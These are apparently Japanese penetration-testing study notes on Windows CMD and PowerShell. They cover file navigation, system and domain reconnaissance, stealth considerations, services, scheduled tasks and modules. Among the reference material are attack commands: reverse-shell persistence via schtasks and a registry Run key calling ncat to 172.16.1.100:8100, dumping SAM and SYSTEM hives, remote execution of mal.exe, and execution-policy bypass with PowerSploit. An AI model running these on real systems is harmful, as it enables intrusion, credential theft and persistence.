# 1 CMD(MS DOS shell)
* cmd.exeのパス：`C:\Windows\System32\cmd.exe`
* helpコマンド：help %cmd% , コマンド /?  (基本、マニュアルを確認すればなんでも行けるからまずマニュアルみろおおお)
* 使えるショートカット


## (1) ナビゲーション
* dir  - ディレクトリ内のファイルを一覧表示
* cd   - 移動(引数なしだと、カレントディレクトリのパスを教えてくれるよ)
* tree - ファイルシステムの内容の一覧表示(設定、プロジェクト ファイルやフォルダー、さらには究極の目標であるパスワードを含むファイルやフォルダーなど、必要な重要な情報を含むファイルやフォルダーを検索するときに非常に便利)
> ```
> tree /F (指定されたパス内のすべてのファイルとフォルダーの一覧を取得する)
> ```

### ① 興味深いファイル
侵入後の権限昇格のために使えるディレクトリだよ
| 名前                     | 場所                           | 説明                                                                                           |
|------------------------|------------------------------|------------------------------------------------------------------------------------------------|
| %SYSTEMROOT%\Temp     | C:\Windows\Temp              | グローバルなディレクトリで、全ユーザーがアクセスできる一時的なシステムファイルを含む。全ユーザーにフルアクセス権が与えられている。低特権ユーザーがファイルをドロップするのに便利。  |
| %TEMP%                 | C:\Users\<user>\AppData\Local\Temp | ユーザー専用の一時ファイルを含むローカルディレクトリ。フォルダの所有者にフルオーナーシップが与えられる。ローカルまたはドメインに参加しているユーザーアカウントを攻撃者が取得した際に便利。  |
| %PUBLIC%               | C:\Users\Public              | インタラクティブログインアカウントがファイルやサブフォルダに対してフルアクセスできる公共アクセス可能なディレクトリ。監視が少ないため、グローバルWindows Tempディレクトリの代替として利用可能。 |
| %ProgramFiles%         | C:\Program Files             | システムにインストールされているすべての64ビットアプリケーションが含まれるフォルダ。ターゲットシステムにインストールされているアプリケーションを確認するのに便利。                  |
| %ProgramFiles(x86)%    | C:\Program Files (x86)      | システムにインストールされているすべての32ビットアプリケーションが含まれるフォルダ。ターゲットシステムにインストールされているアプリケーションを確認するのに便利。                   |
| %HOME%                 | C:\Users\%user%             | ユーザが作業しているところなので、いろいろ置かれている。認証情報等のメモや、そのほか、内部に関する情報が含まれる可能性がある。 |

## (2) ディレクトリとファイル操作
* 大体のやつは、/Aオプションが使えて、ファイル属性を指定できるよ(秘密ファイルとか)
* パイプ、リダイレクションはlinuxと変わらない。
* 連続実行は、「&」で、前の実行の可否に依存するのは「&&」

### ① ディレクトリの作成、削除
mkdir - ディレクトリ作成  
rd    - ディレクトリ削除(/sオプションでディレクトリの中身も含めて削除できる)  
  
### ② ファイルの表示
more - ファイルの中身を見れるよ。linuxのlessみたいな感じ。「|」パイプを利用すれば、コマンド実行の結果を見るのも楽だよ(/Sオプションを利用すると結構見やすい)  

#### ◇ パイプを利用したやつ
> ```
> systeminfo | more  
> ```

#### ◇ type
シンプルにファイルの中身を一気に表示するよ。「>>」のリダイレクションを利用すれば、ファイルのテキストをまとめるのが楽だよ。  
##### リダイレクションを利用してファイルのテキストをほかのファイルにまとめる
> ```
> type passwords.txt >> secrets.txt
> ```

### ③ ファイルの作成、削除
`echo` - 標準出力を出してくれるやつ(こいつで、リダイレクションしてファイル作れる)  
`del,erase` - ファイル削除、二つあるのは、互換性を保つためあるだけよ  

### ④ ファイル、ディレクトリの移動、コピー
`move` - ファイル、ディレクトリの移動  
`copy` - ファイル、ディレクトリのコピー  
`xcopy`　- copyの拡張(copyより細かいコピーができるよ。ディレクトリごとコピーが/E、属性情報を変えないとかなら/K)  
`robocopy` - xcopyの拡張  

## (3) システム情報の収集
### ◇ システム情報のタイプ
　一般システム情報 - 固有のOS情報やhost名、適用されているパッチなど。マシンの役割やOSに起因する脆弱性を調べることができる。  
　ネットワーク情報 - IPアドレスやARPテーブル、hostsの情報、ネットワークの接続状態など。ネットワークのマッピングができ、内部ネットワークを解明できる。  
　ドメイン情報 - ドメインに参加しているか。参加していたら、Domain(AD)等の分析を行う。  
　ユーザ情報 - ユーザ名、ユーザの所属グループ、ユーザの権限など。  


※特定のコマンドが他のコマンドよりも厳密に監視および追跡されている場合、情報を収集する方法を 1 つだけ知っていても効率的ではありません。このため、必要な情報を収集し、可能な限り検出を逃れるためには、確立された複数の方法が必要  

### ① 一般システム情報の収集
#### ◇ systeminfo
OS情報、ホスト名、IP アドレス、ドメインに属しているかどうか、インストールされている修正プログラムなど

#### ◇ hostname
ホスト名

#### ◇ ver
OSバージョン情報

#### ◇ time /t
システムの時刻

#### ◇ 「fsutil fsinfo drives」
マウントされているドライブの確認


### ② ネットワーク情報
#### ◇ ipconfig /all
ドメイン名、IPアドレス、サブネットマスク、デフォルトゲート、MACアドレス、DHCP設定、DNS設定など

#### ◇ arp /a
ARPテーブル(ターゲットがどのホストと接続したかを確認でき、アクセスできる可能性の高いIPがわかる)
 
#### ◇ type C:\windows\system32\drivers\etc\hosts
hostsファイルの情報からレガシーシステム等のドメイン情報などが取得できる

#### ◇ netstat -ano
ポートの接続状況(どこと通信をしているかを把握できる)

#### ◇「netsh winhttp show proxy」
プロキシ設定の表示

### ② ユーザ情報

#### ■ 自身のユーザ情報を取得
##### ◇ whoami
###### オプション無し  ログインユーザの参加ドメイン、ユーザ名
###### /priv          ログインユーザの権限情報
###### /groups        ログインユーザの所属グループ
###### /all           ログインユーザのSID、参加ドメイン、ユーザ名、所属グループ、権限情報(上にあるやつ全て表示)

##### ◇  ユーザ関連の環境変数を表示させる
ログインユーザのユーザ名、参加ドメイン、sshなどのツールに関する情報などがわかる。
```
set user
```
##### ◇ 環境変数の値を列挙
```
set 
```
##### ◇ 共有情報の列挙
現在侵害を受けているユーザーがアクセスできる共有のリストが分かる
```
net share
```

##### ◇ 共有リソースの列挙
```
net view
```

##### ◇ 起動中のサービスを表示
```
net start
```

##### ◇ サーバーサービスの構成情報を確認する
サーバ名、OSバージョン、最大ユーザ数、最大セッション数がわかる
```
net config server
```

##### ◇ ワークステーションサービスの構成情報を確認する
マシン名、ユーザ名、OSバージョン、使用ドメインなどの情報がわかる
```
net config workstation
```
#### ■ ほかのユーザ情報の取得
```
net user
```
##### オプション無し 
ローカルユーザの列挙
##### /domain 
参加ドメイン内のユーザの列挙

##### ユーザ名を指定 
ユーザのアカウント情報や所属グループ等(ドメインユーザなら/domainをつける必要がある)

#### ■ ほかのグループ情報の取得
##### ◇ ローカルグループに所属するユーザ一覧取得
```
net localgroup
```   
* オプション無し  ローカルグループ名の列挙
* グループ指定    指定したローカルグループに参加しているユーザ名

##### ◇ 特定ドメインのグループに所属するユーザ一覧取得
```
net group
```

* オプション無し  ドメイングループ名を列挙
* /domain        ドメインを指定する(デフォルト : 自分が参加しているドメイン)
* グループ指定    指定したドメイングループに参加しているユーザ名

##### ■ AD情報の収集
###### ◇ Active Directoryに含まれるアカウントの検索
```
dsquery
```

###### ◇ Active Directoryに含まれるアカウント情報取得
```
csvde
```

### ④ コマンドによるシステム情報の列挙などのシステム内での情報収集について
これは、限られたリソースの中で、CMDを使用してどのようにアクセスし、アセスメントを継続できるかを簡単に示したものである。 
* このルートは非常にノイズが多く、半端な能力を持つブルーチームにさえいずれは気づかれてしまうことを心に留めておいてください。
* 現状では、私たちは大量のログを書き、複数のホストに痕跡を残していますが、彼らのEDRやNIDSが何を見ることができたかについてはほとんど何もわかりません。

## --コラム-- ステルスミッション どのようにすればノイズが少ないのか？
◇ コマンドからでなく、設定ファイル等の内容を「type」コマンドなどで表示する形ならどうだろうか  
⇒　参照できる設定ファイルからシステム情報を読み取る方法  
  
◇ 利用できるプログラム、サービスを探したいのであれば、`C:\Program Files (x86)`配下のディレクトリを列挙するとか  
⇒　特定のディレクトリの配下のファイル、ディレクトリの列挙によりシステム情報を読み取る方法

◇ OSやプログラムの更新、サービスやドライバーの使用をファイルのタイムスタンプで推測する。  
⇒　`dir`の`/T:`オプションを利用する
  
が、自分的に考えられたよ。
### ① dirによるインストールの列挙、サービスの列挙、ドライバーの列挙(使用されているかどうかは、ファイルタイムスタンプの履歴とかで分かるはず)
| 項目                          | ディレクトリ                                                                                         | コマンド  |
|-------------------------------|------------------------------------------------------------------------------------------------------|--------------|
| **32ビットアプリケーション** | `C:\Program Files (x86)`  | `dir "C:\Program Files (x86)" /s`             |
| **64ビットアプリケーション** | `C:\Program Files`                                       | `dir "C:\Program Files" /s`                   |
| **Windowsアプリ (UWP)**      | `C:\Program Files\WindowsApps`                   | `dir "C:\Program Files\WindowsApps" /s`       |
| **スタートアップ (全ユーザー)**| `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`   | `dir "C:\ProgramData\...\StartUp" /s`         |
| **スタートアップ (ユーザー)** | `C:\Users\<ユーザー名>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp`      | `dir "C:\Users\...\StartUp" /s`  |
| **サービス実行**      | `C:\Windows\System32`                                                                                 | `dir "C:\Windows\System32" /s`  |
| **インストールされているドライバー**       | `C:\Windows\System32\drivers`  | `dir "C:\Windows\System32\drivers" /s`        |

### ② 特定のファイルからの読取り(例：OSのライセンス情報)
ファイルパス：C:\Windows\System32\license.rtf
インストールされたエディション情報や、大まかなOSバージョンがわかる。
### ③ dirによるタイムスタンプの列挙
#### ■ dirコマンドのタイムスタンプオプション(/T)
/T:C - 作成日時をタイムフィールドに出力  
/T:A - 最終アクセス日時をタイムフィールドに出力  
/T:W - 最終更新日時をタイムフィールドに出力  

#### ■ 最終更新日時からわかること  
##### ◇ Windowsのインストール時期  
license.rtf ファイルは、Windowsがインストールされたときに作成されるため、インストールされた日を示す可能性が高い。  
   　    
##### ◇ OSのアップデート  
license.rtfファイルの最終更新日時が最近であれば、Windowsのアップデートやパッチ適用時にファイルが更新された可能性がある。  
この場合、最新のアップデートに関連する変更があったことを示唆している。  

##### ◇ そのほかツールのアップデート
ツールやサービスをアップデートすると、当たり前だが、更新されるので、最終更新日時から、どれくらいたっているかで、そのツールやサービスのバージョン等がある程度推測できる。

#### ■ 最終アクセス日時  
#####  ◇ システム、ツール等の利用状況
最終アクセス日時が最近であれば、ユーザーがファイルを参照したか、何らかの理由で使用された可能性がある。  
これにより、ユーザーのアクティビティやシステム管理の状況が推測できるかもしれない。  
また、よく利用されているツールがわかるかもしれない

#### ■ 作成日時 
##### ◇ OSの初期設定  
この日時は、通常、OSの初期インストール時のタイムスタンプであるため、そのマシンがいつ導入されたのかを知る手がかりとなる。  

#### ■ 推測の限界  
##### ◇ ファイルが削除されたり再作成された場合  
   タイムスタンプが更新されることがある。たとえば、ファイルが削除されて新たに作成された場合、作成日時が変わります。  
##### ◇ 更新の頻度  
   Windows Updateが定期的に行われるため、ファイルのタイムスタンプが頻繁に更新されることがあるが、その内容の変更は直接的に示されないことがある。  
##### ◇ dockerや仮想マシンだった場合
そのマシンの導入状況は、OS関連ファイルやツール、サービス等の作成日時や最終アクセス日時は、あてにならないかも

### ④ まとめ
なんかやってることが、デジタルフォレンジックのファイルシステムの解析に似ていた。  
ファイルシステムの構造を知っていると、コマンドに頼らなくてもある程度内部偵察や脆弱性の探索ができそうだと感じた。  
フォレンジックの技術が攻撃者にも利用できると感じた。  

## --コラム-- ポートの接続状況からわかること
### ◇ 外部のサーバ等との連携や接続
クラウドにサーバがあったり、サーバを分散している場合、外部のネットワークのIPと通信している可能性がある
  
### ◇ セキュリティ構成を推定
動いているセキュリティソフトと合わせてみることで、どのような構成のセキュリティシステムが実際に施されているのか推定することができるんじゃね。
具体的には、監視ソフトが利用されているとか、どこが監視用サーバとかが、わかるかもしれない。どのような形態でセキュリティソフトがりよされているかとか

### ◇ RDPとかの通信があったら
セッションを乗っ取ることができるかもしれない


## (4) ファイルとディレクトリの検索
コンフィグファイルや興味深い認証に関連するファイル、企業の機密ファイルとかを探すときに使える。

### ① ファイル検索 - Where   
#### ◇ コマンドのファイルパスの検索
```
where cmd.exe
```
#### ◇ 指定したフォルダ以下に対するファイル名の検索(再帰的な検索)  
```
where /R %dir% %filename%
```
※ワイルドカードを利用できる  
  
#### ◇ 再帰的検索とワイルドカードを利用した。txtファイルの検索  
```
where /Users/ *.txt
```

### ② 文字列検索 
find,findstr (「findstr」がlinuxでいうgrepみたいなやつになっているからそっち使った方がいい,ちな正規表現使える)

### ③ 比較 
comp,fc (linuxのdiffとかわらん)

### ④ 整列、一意化 
sort (/uniqueオプションで重複を消せる)

### --コラム-- この会で出たの問題のflagについて
flagが -> RmxhZ3MgYXJlbid0IGhhcmQgdG8gZmluZCBub3csIHJpZ2h0Pw==だった  
  
これはBASE64でHTTPとかで文字のみでデータを送りたいときにこのようにエンコードする

#### ■ デコードしてみた
certutilを用いる  
```
echo RmxhZ3MgYXJlbid0IGhhcmQgdG8gZmluZCBub3csIHJpZ2h0Pw== > md5.txt
certutil -decode md5.txt decode.txt
type decode.txt

Flags aren't hard to find now, right?
```
今では旗を見つけるのは難しくありませんよね？とか書かれてた（笑）。

#### ■ cetutilについて
もとは、デジタル証明書とか用の検証とかいろいろ行うためのツールだが、こいつは、めっちゃいろいろなツールとして使える  
  
◇ ファイルのハッシュ値を求めるツールとして  
-hashfile  
  
◇ BASE64にエンコードデコードするツールとして  
-encode、-decode  
  
◇ URLからファイルを落とすツールとして  
-URLCache  

## (5) 環境変数
### ① 変数のスコープ
#### ◇ グローバルスコープ 
グローバル変数はアクセス可能ですglobally。このコンテキストでは、グローバル スコープにより、プログラム内のどこからでも変数内に格納されたデータにアクセスして参照できることがわかります。  
  
#### ◇ ローカルスコープ
ローカル変数はlocalコンテキスト内でのみアクセスできます。Localつまり、これらの変数内に格納されたデータは、それが宣言された関数またはコンテキスト内でのみアクセスおよび参照できます。  

### ②　変数の作成
#### ◇ ローカル変数の作成　 
```
set <hensu>=<value>  
```

#### ◇ グローバル変数の作成
``` 
setx <hensu> <value>  
```

### ③ 重要な環境変数
<table class="table table-striped text-left">
<thead>
<tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">変数名</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%PATH%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">実行可能プログラムが配置されているディレクトリ (場所) のセットを指定します。</font></font></td>
</tr>
<tr>
<td><code>%OS%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーのワークステーション上の現在のオペレーティング システム。</font></font></td>
</tr>
<tr>
<td><code>%SYSTEMROOT%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に展開されます</font></font><code>C:\Windows</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。Windows システム フォルダーを含む、システム定義の読み取り専用変数です。重要なデータ、コア システム バイナリ、構成ファイルなど、Windows がコア機能にとって重要と見なすものはすべてここにあります。</font></font></td>
</tr>
<tr>
<td><code>%LOGONSERVER%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのログイン サーバーと、それに続くマシンのホスト名を提供します。この情報を使用して、マシンがドメインまたはワークグループに参加しているかどうかを確認できます。</font></font></td>
</tr>
<tr>
<td><code>%USERPROFILE%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのホーム ディレクトリの場所を提供します。 に展開されます</font></font><code>C:\Users\{username}</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
</tr>
<tr>
<td><code>%ProgramFiles%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所は、ベース システム上のすべてのプログラムがインストールされる場所です</font></font><code>x64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
</tr>
<tr>
<td><code>%ProgramFiles(x86)%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files (x86)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所には、実行中のすべての 32 ビット プログラム</font></font><code>WOW64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">がインストールされます。この変数は 64 ビット ホストでのみアクセス可能であることに注意してください。これは、対話しているホストの種類を示すために使用できます。(</font><font style="vertical-align: inherit;">アーキテクチャ</font></font><code>x86</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">とは対照的)</font></font><code>x64</code><font style="vertical-align: inherit;"></font></td>
</tr>
</tbody>
</table>

## (6) サービス管理
永続化にも利用できるし、脆弱性のあるサービスが動いていたら、権限昇格にも利用できる

### ① 稼働しているサービスの列挙
#### ◇ scコマンド 
```
sc query type= service
```
  
#### ◇ tasklistコマンド 
```
tasklist /svc
```  
  
#### ◇ ポートを利用しているサービスの確認
```
net start
```  
  
#### ◇ wmicの利用 
```
wmic service list brief
```  
  
※ここから気になったやつは、それぞれのコマンドで個々のサービスを検索できる
### ② サービスを操作するとき
サービスの依存関係を考えて操作する必要がある

#### 例 Windows updateの停止(wuauserv)
Windows updateを停止するためには、二つのサービスを消す必要がある
* wuauserv (Windows アップデート サービス)
* bits (バックグラウンド インテリジェント転送サービス)

### ③ Windows Defender(windefend)
SYSTEM権限がなければこれを停止することができない。現最新OSのWiondows11では、セーフティモードでないとディフェンダーを無効化できなくなっている。

## (7) タスクスケジュール
永続化にも利用できるし、脆弱性のあるスクリプトがタスクとして動いていたら、権限昇格にも利用できる。  
  
マルウェア ⇒ 行動がばれないように特定の時間や場所、イベント発生で動くように作られているものがある。  

### ① タスクスケジュールするトリガー
* 特定のシステム イベントが発生したとき。
* 特定の時間に。
* 毎日のスケジュールの特定の時間。
* 毎週のスケジュールに従って特定の時間に。
* 月ごとのスケジュールに従って特定の時間に。
* 月ごとの曜日スケジュールの特定の時間。
* コンピュータがアイドル状態になったとき。
* タスクが登録されたとき。
* システムが起動したとき。
* ユーザーがログオンするとき。
* ターミナル サーバー セッションの状態が変わったとき。

などがある。
### ② schtasks によるタスクスケージュール管理
#### ◇ すべてのタスクスケジュールの詳細をリストする
```
SCHTASKS /Query /V /FO list
```
  
#### ◇ 新しいタスクをスケジュールする(例： リバースシェルによる永続化)
```
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```

#### ◇ リモートマシンへ新しいタスクをスケジュールする.
※細かいところはマニュアル見ろよ

### ③ 他のコマンドによるリモートに対するタスクのスケージュールを実行
#### ◇ at (Windows 11では、廃止されている)  
```
at \\[リモートホスト名 or IPアドレス] 12:00 cmd /c "C:\windows\temp\mal.exe"
```
  
#### ◇ wmic  
```
wmic /node:[IPアドレス] /user:”[ユーザ名]” /password:”[パスワード]” process call create “cmd /c c:\Windows\System32\net.exe user”
```
## --コラム--
(6)と(7)で扱ったものは、リモートで実行させることが可能。  
リモートのマシンへの資格情報等があれば、リモートマシンに対して、任意のタスクをスケジュールしたり、任意のサービスを実行させることが、できる  
⇒ 横展開(マルウェアなら感染を拡大するために利用できる)

## (8) レジストリの操作
### ① regによるレジストリ操作
◇ SAM、SYSTEM等のレジストリハイブの出力
```
reg save hklm\system system
reg save hklm\sam sam
```

◇ ユーザログオン時に実行するファイルを指定  
```
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v hello_value /t REG_SZ /d "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100" 
```

# 2 PowerShell
## (1) cmd vs Powershell
### ① cmdとPowerShellの比較
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特徴</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMDF</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パワーシェル</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">言語</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">バッチおよび基本的な CMD コマンドのみ。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell は、バッチ、CMD、PS コマンドレット、およびエイリアスを解釈できます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンドの使用</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あるコマンドの出力を別のコマンドに直接渡すことはできません。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あるコマンドの出力を別のコマンドに直接渡すことができます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンド出力</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">テキストのみ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell はオブジェクト形式で出力します。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">並列実行</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMD は、別のコマンドを実行する前に 1 つのコマンドを終了する必要があります。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell は、コマンドをマルチスレッド化して並列実行できます。</font></font></td>
</tr>
</tbody>
</table>

### ② セキュリティ的なところ
◇ コマンドログを残すか  
　`cmd.exe`　　　⇒ 残さない  
　`powershell`　 ⇒ 残す  
　  
◇ 実行ポリシー  
　`cmd.exe`　　　⇒ なし  
　`powershell`　 ⇒ あり(回避策は、普通にある)  
  
  
### ③ 結論 
◇ よって実行ポリシーを避けたり、できるだけまだバレたくない(ステルス性を重視する)場合  
　`cmd.exe`
　  
◇ それ以外  
　`powershell`

※ ていっても、実行ポリシー自体の制約は、powershellの操作で解除できるからそんな関係ないかも  
UACは、どっちにもかかるyo
## (2) powershellの利用
### ① powershellの利用場面例
Windows システムが管理されているシステム管理者、侵入テスト担当者、SOC アナリスト、その他多くの技術分野で広く使用されています。  
Windows サーバー、デスクトップ (Windows 10 および 11)、Azure、Microsoft 365 クラウドベースのアプリケーションで構成される IT 環境を管理する IT 管理者と Windows システム管理者について考えてみましょう。  
彼らの多くは、毎日実行する必要があるタスクを自動化するために PowerShell を使用している  

#### ◇ 次のようなタスクがあったりする
* サーバーのプロビジョニングとサーバーの役割のインストール
* 新入社員用の Active Directory ユーザー アカウントの作成
* Active Directory グループの権限の管理
* Active Directory ユーザー アカウントの無効化と削除
* ファイル共有権限の管理
* Azure AD および Azure VMとのやり取り
* ディレクトリとファイルの作成、削除、監視
* ワークステーションとサーバーに関する情報の収集
* ユーザー用の Microsoft Exchange メール受信トレイの設定 (クラウドおよび/またはオンプレミス)

### ② 基本的な操作
#### ◇ ヘルプ  
* ヘルプの取得
```
Get-Help
```  
* ヘルプのアップデート
```
Update-Help
``` 
#### ◇ カレントディレクトリの表示  
```
Get-Location
``` 

#### ◇ ディレクトリの一覧表示  
```
Get-ChildItem
```
 
#### ◇ ディレクトリの移動  
```
Set-Location
```
 
#### ◇ コンテンツの取得(内容表示)  
```
Get-Content
```
 
#### ◇ 画面をクリアする  
```
cls  
```
 
#### ◇ 標準入力を表形式のフォーマットで出力する  
```
Format-Table  
```

#### ■ PowerShell の使用に関するヒントとコツ
##### ◇ コマンド探し(Get-Command)  
no option - 利用できるコマンドレットを一覧表示  
`-verb`　 - 動詞(getなど)の指定  
`-noun`　 - 名詞(conntentsなど)の指定
　  
##### ◇ エイリアス    
get-alias - エイリアスの一覧を表示  
set-alias - エイリアスを設定  
```
Set-Alias -Name gh -Value Get-Help
```
　  
##### ◇ ヒストリ（Get-History)  
no option - このアクティブ セッション中に実行されたコマンドのみを表示  


##### ◇ 実行されたPowerShellコマンドの履歴
* すべてのPowerShellの実行履歴の保存ファイルのパス  
```
$($host.Name)_history.txt$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine
```
  
* 実行履歴のセキュリティについて  
認証情報につながるものは、フィルタリングされるようになっている  

#### ◇ 便利なエイリアス
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エイリアス</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pwd</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gl も使用できます。このエイリアスは Get-Location の代わりに使用できます。</font></font></td>
</tr>
<tr>
<td><code>ls</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir と gci も ls の代わりに使用できます。これは Get-ChildItem のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>cd</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd の代わりに sl と chdir を使用できます。これは Set-Location のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>cat</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">type と gc も使用できます。これは Get-Content のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>clear</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Clear-Host の代わりに使用できます。</font></font></td>
</tr>
<tr>
<td><code>curl</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Curl は Invoke-WebRequest の別名で、ファイルのダウンロードに使用できます。wget も使用できます。</font></font></td>
</tr>
<tr>
<td><code>fl and ft</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これらのエイリアスを使用して、出力をリストおよびテーブル出力にフォーマットできます。</font></font></td>
</tr>
<tr>
<td><code>man</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">help の代わりに使用できます。</font></font></td>
</tr>
</tbody>
</table>

### ③ 便利なホットキー
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ホットキー</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>CTRL+R</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">検索可能な履歴になります。その後入力を開始すると、以前のコマンドに一致する結果が表示されます。</font></font></td>
</tr>
<tr>
<td><code>CTRL+L</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">画面を素早くクリアします。</font></font></td>
</tr>
<tr>
<td><code>CTRL+ALT+Shift+?</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これにより、PowerShell が認識するキーボード ショートカットのリスト全体が印刷されます。</font></font></td>
</tr>
<tr>
<td><code>Escape</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLI に入力するときに、行全体をクリアしたい場合は、バックスペースキーを押す代わりに、</font></font><code>escape</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を押すだけで行を消去できます。</font></font></td>
</tr>
<tr>
<td><code>↑</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これまでの履歴を上にスクロールしてください。</font></font></td>
</tr>
<tr>
<td><code>↓</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これまでの履歴を下にスクロールしてください。</font></font></td>
</tr>
<tr>
<td><code>F7</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">セッションからのスクロール可能なインタラクティブな履歴を含む TUI を表示します。</font></font></td>
</tr>
</tbody>
</table>

## (3) コマンドレットとモジュールについて　
### ① コマンドレット
コマンドレットは動詞-名詞構造に従っており、これにより、特定のコマンドレットが何を行うかを理解しやすくなります。

### ② モジュール
PowerShellモジュールは、使いやすく共有しやすいように構造化された PowerShell コードです。Microsoft の公式ドキュメントに記載されているように、モジュールは次の要素から構成されます。  
  
* コマンドレット
* スクリプトファイル
* 機能
* アセンブリ
* 関連リソース（マニフェストとヘルプファイル）

◇ Windowsを攻撃するためのモジュール(PowerSploit)  
　URL：https://github.com/PowerShellMafia/PowerSploit  

#### ■ psd1(モジュールマニフェストファイル)
PowerShellのデータファイル「.psd1」は、モジュールマニフェストファイル。以下のことが含まれる  
  
* 処理されるモジュールへの参照
* 主要な変更を追跡するためのバージョン番号
* GUID
* モジュールの作者
* 著作権
* PowerShell 互換性情報
* モジュールとコマンドレットが含まれています
* メタデータ

### ③ モジュールの操作
#### ◇ ロードされているモジュールの一覧表示  
```
Get-Module
```  
　  
#### ◇ インストールされているがセッションでロードされていないモジュールの表示　　
```
Get-Module -ListAvailable
```  
　  
#### ◇ モジュールのロード  
```
Import-Module .\PowerSploit.psd1
``` 
(大体実行ポリシーで実行できない、変更はできるけど)  
  
#### ■ 実行ポリシーの変更
PowerShell スクリプトとモジュールを使用する際に考慮すべき重要な要素は、PowerShell の実行ポリシーです。Microsoft の公式ドキュメントに記載されているように、実行ポリシーはセキュリティ制御ではない。なので普通に解除できる。  
　  
##### ◇ 実行ポリシーの確認  
```
Get-ExecutionPolicy
```  
　  
##### ◇ 実行ポリシーの変更(プロセスに対し行う)  
```
Set-ExecutionPolicy -scope Process Bypass
```

#### ■ モジュール内のコマンドを探す
```
Get-Command -Module PowerSploit
```

#### ■ モジュールを検索
```
Find-Module -Name
```

### ④ PowerShellで知っておくべきツール
#### ◇ AdminToolbox  
AdminToolbox は、システム管理者が Active Directory、Exchange、ネットワーク管理、ファイルやストレージの問題などを扱うさまざまなアクションを実行できるようにする便利なモジュールのコレクション。  
　  
#### ◇ ActiveDirectory  
このモジュールは、Active Directory に関するすべてのローカルおよびリモート管理ツールのコレクションです。これを使用して、ユーザー、グループ、権限などを管理できます。  
　  
#### ◇ Empire / Situational Awareness  
